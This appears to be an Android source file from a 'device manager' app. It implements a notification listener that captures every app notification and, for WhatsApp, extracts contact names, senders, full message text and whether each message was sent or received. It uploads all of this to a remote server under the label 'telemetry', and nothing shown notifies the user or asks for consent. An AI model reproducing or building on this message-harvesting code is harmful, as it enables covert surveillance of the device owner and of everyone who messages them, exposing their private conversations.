package com.company.devicemgr.services;

import android.app.Notification;
import android.app.Person;
import android.os.Build;
import android.os.Bundle;
import android.os.Parcelable;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import com.company.devicemgr.utils.HttpClient;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.List;

public class NotificationListenerSvc extends NotificationListenerService {
    private static final String TAG = "NotifListenerSvc";
    private static final String PREFS = "devicemgr_prefs";
    private static final String KEY_RECENT_WHATSAPP_CONTACTS = "recent_whatsapp_contacts";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String pkg = sbn.getPackageName();
            Notification notif = sbn.getNotification();
            if (notif == null) return;

            JSONObject payload = buildPayload(sbn, notif, pkg);
            if (payload == null) return;

            new Thread(() -> {
                try {
                    android.content.SharedPreferences sp = getSharedPreferences(PREFS, MODE_PRIVATE);
                    String token = sp.getString("auth_token", null);
                    String deviceId = sp.getString("deviceId", "unknown");
                    String url = com.company.devicemgr.utils.ApiConfig.api("/api/telemetry/" + deviceId);
                    JSONObject body = new JSONObject();
                    boolean isWhatsapp = isWhatsappPackage(pkg);
                    body.put("type", isWhatsapp ? "whatsapp" : "notification");
                    body.put("payload", payload);
                    HttpClient.postJson(url, body.toString(), token);
                    if (isWhatsapp) rememberWhatsappContact(payload);
                } catch (Exception e) {
                    Log.e(TAG, "notif send err", e);
                }
            }).start();
        } catch (Exception e) {
            Log.e(TAG, "onNotificationPosted error", e);
        }
    }

    private JSONObject buildPayload(StatusBarNotification sbn, Notification notif, String pkg) throws Exception {
        Bundle extras = notif.extras;
        CharSequence title = extras.getCharSequence(Notification.EXTRA_TITLE);
        CharSequence text = extras.getCharSequence(Notification.EXTRA_TEXT);
        CharSequence subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT);
        CharSequence conversationTitle = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE);
        CharSequence selfDisplayName = extras.getCharSequence(Notification.EXTRA_SELF_DISPLAY_NAME);

        String titleS = title != null ? title.toString() : "";
        String textS = text != null ? text.toString() : "";
        String subTextS = subText != null ? subText.toString() : "";
        String conversationTitleS = conversationTitle != null ? conversationTitle.toString() : "";
        String selfDisplayNameS = selfDisplayName != null ? selfDisplayName.toString() : "";
        long eventTs = sbn.getPostTime() > 0 ? sbn.getPostTime() : System.currentTimeMillis();

        JSONObject payload = new JSONObject();
        payload.put("package", pkg);
        payload.put("title", titleS);
        payload.put("text", textS);
        payload.put("subText", subTextS);
        payload.put("conversationTitle", conversationTitleS);
        payload.put("selfDisplayName", selfDisplayNameS);
        payload.put("ts", eventTs);

        if (!isWhatsappPackage(pkg)) {
            payload.put("syncKey", "notif|" + pkg + "|" + eventTs + "|" + sbn.getId() + "|" + titleS.hashCode() + "|" + textS.hashCode());
            return payload;
        }

        JSONObject whatsapp = extractWhatsappMessage(pkg, notif, extras, titleS, textS, conversationTitleS, selfDisplayNameS, eventTs, sbn.getId());
        if (whatsapp == null) return null;
        return whatsapp;
    }

    private JSONObject extractWhatsappMessage(String pkg, Notification notif, Bundle extras, String titleS, String textS, String conversationTitleS, String selfDisplayNameS, long eventTs, int notificationId) throws Exception {
        String contactName = firstNonEmpty(conversationTitleS, titleS);
        String senderName = titleS;
        String messageBody = textS;
        String direction = "received";

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            Parcelable[] rawMessages = extras.getParcelableArray(Notification.EXTRA_MESSAGES);
            if (rawMessages != null && rawMessages.length > 0) {
                List<Notification.MessagingStyle.Message> messages = Notification.MessagingStyle.Message.getMessagesFromBundleArray(rawMessages);
                if (!messages.isEmpty()) {
                    Notification.MessagingStyle.Message last = messages.get(messages.size() - 1);
                    CharSequence messageText = last.getText();
                    messageBody = messageText != null ? messageText.toString() : messageBody;
                    Person senderPerson = last.getSenderPerson();
                    CharSequence sender = senderPerson != null ? senderPerson.getName() : last.getSender();
                    if (sender != null && sender.length() > 0) senderName = sender.toString();
                }
            }
        }

        if (!selfDisplayNameS.isEmpty() && senderName.equalsIgnoreCase(selfDisplayNameS)) {
            direction = "sent";
        } else if (messageBody != null && messageBody.startsWith("You:")) {
            direction = "sent";
            messageBody = messageBody.substring(4).trim();
        }

        if (contactName == null || contactName.trim().isEmpty()) {
            contactName = senderName;
        }
        if (senderName == null || senderName.trim().isEmpty()) {
            senderName = contactName;
        }
        if ((contactName == null || contactName.trim().isEmpty()) && (messageBody == null || messageBody.trim().isEmpty())) {
            return null;
        }

        JSONObject payload = new JSONObject();
        payload.put("source", "whatsapp");
        payload.put("package", pkg);
        payload.put("appPackage", pkg);
        payload.put("contactName", contactName);
        payload.put("from", senderName);
        payload.put("body", messageBody);
        payload.put("direction", direction);
        payload.put("conversationTitle", conversationTitleS);
        payload.put("title", titleS);
        payload.put("text", messageBody);
        payload.put("ts", eventTs);
        payload.put("syncKey", "wa|" + contactName + "|" + senderName + "|" + eventTs + "|" + notificationId + "|" + (messageBody != null ? messageBody.hashCode() : 0));
        return payload;
    }

    private void rememberWhatsappContact(JSONObject payload) {
        try {
            String contactName = firstNonEmpty(payload.optString("contactName", null), payload.optString("from", null));
            if (contactName == null || contactName.trim().isEmpty()) return;
            android.content.SharedPreferences sp = getSharedPreferences(PREFS, MODE_PRIVATE);
            JSONArray arr = new JSONArray(sp.getString(KEY_RECENT_WHATSAPP_CONTACTS, "[]"));
            JSONObject row = new JSONObject();
            row.put("contactName", contactName);
            row.put("senderName", payload.optString("from", null));
            row.put("direction", payload.optString("direction", "received"));
            row.put("ts", payload.optLong("ts", System.currentTimeMillis()));
            arr.put(row);
            JSONArray trimmed = new JSONArray();
            int start = Math.max(0, arr.length() - 60);
            for (int i = start; i < arr.length(); i++) trimmed.put(arr.get(i));
            sp.edit().putString(KEY_RECENT_WHATSAPP_CONTACTS, trimmed.toString()).apply();
        } catch (Exception e) {
            Log.e(TAG, "rememberWhatsappContact err", e);
        }
    }

    private boolean isWhatsappPackage(String pkg) {
        return "com.whatsapp".equals(pkg) || "com.whatsapp.w4b".equals(pkg);
    }

    private String firstNonEmpty(String... values) {
        if (values == null) return null;
        for (String value : values) {
            if (value != null && value.trim().length() > 0) return value.trim();
        }
        return null;
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // no-op
    }
}
